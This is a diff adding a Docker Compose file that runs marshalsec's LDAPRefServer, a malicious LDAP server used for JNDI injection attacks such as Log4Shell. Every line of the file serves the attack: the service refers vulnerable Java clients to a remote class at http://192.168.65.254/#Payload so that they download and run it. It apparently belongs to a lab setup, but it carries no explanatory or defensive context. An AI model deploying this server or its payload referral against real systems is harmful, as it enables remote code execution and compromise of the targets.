@@ -1,0 +1,15 @@
+version: '3.5'
+
+services:
+  ldap-server:
+    build: ldap-server
+    container_name: ldap-server
+    ports:
+      - 1389:1389
+    entrypoint:
+      - java
+      - -cp
+      - /usr/app/marshalsec-0.0.3-SNAPSHOT-all.jar
+      - marshalsec.jndi.LDAPRefServer
+      - http://192.168.65.254/#Payload
+    restart: always
